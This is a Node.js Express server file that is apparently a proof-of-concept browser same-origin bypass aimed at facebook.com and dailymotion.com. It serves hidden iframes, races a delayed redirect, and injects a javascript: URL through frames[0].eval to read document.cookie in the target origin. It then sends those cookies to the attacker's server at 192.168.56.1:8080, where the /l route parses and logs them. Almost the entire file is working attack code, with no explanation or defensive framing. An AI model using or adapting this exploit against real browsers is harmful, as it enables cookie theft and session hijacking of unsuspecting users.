// app.js
// -*- coding: utf-8 -*-
// vim:fenc=utf-8
// vim:foldmethod=syntax
// vim:foldnestmax=1
//
// jslint es5: true
"use strict;";

var targets = ['https://www.facebook.com/robots.txt', 'http://www.dailymotion.com/robots.txt'];
var thisHost = 'http://192.168.56.1:8080';
var express = require('express');
var url = require('url');
var cookie = require('cookie');

var app = express();

app.get('/r/:id', function(req, res, next) {
  setTimeout(function() {
    res.redirect(targets[parseInt(req.params.id)]);
  }, 2000);
});

app.get('/l', function(req, res, next) {
  res.send('');

  var u = url.parse(req.url);
  var s = /_id=(\d+)\|(.*)/.exec(u.query);
  var cs = cookie.parse(unescape(s[2]));

  console.log(targets[parseInt(s[1])]);
  console.log(JSON.stringify(cs, null, ' '));
});

app.get('/d', function(req, res, next) {
  setTimeout(function() {
    res.send('');
  }, 5000);
});

function getExploit(id) {
  return 'frames[0].eval(\'_=parent.frames[1];with(new XMLHttpRequest)open("get","' + thisHost + '/d",false),send();_.location="javascript:bkp=\\\'' + thisHost + '/l?_id=' + id + '|\\\'+document.cookie;window.location(bkp);"\');';
}

app.get('/exploit/:id', function(req, res, next) {
  var id = parseInt(req.params.id);
  var page = [
    '<iframe style="display:none;" src="/r/' + id + '"></iframe>',
    '<iframe style="display:none;" src="' + targets[id] + '"></iframe>',
    '<script>',
    getExploit(id),
    '</script>'
  ];
  res.send(page.join('\n'));
});

app.use(function(req, res, next) {
  var page = [];
  for (var k = 0; k < targets.length; k++) {
    page.push('<iframe style="display:none;" src="/exploit/' + k + '"></iframe>');
  }
  res.send(page.join('\n'));
});

app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.send('');
});

var http = require('http');
var server = http.createServer(app);
server.listen(8080);
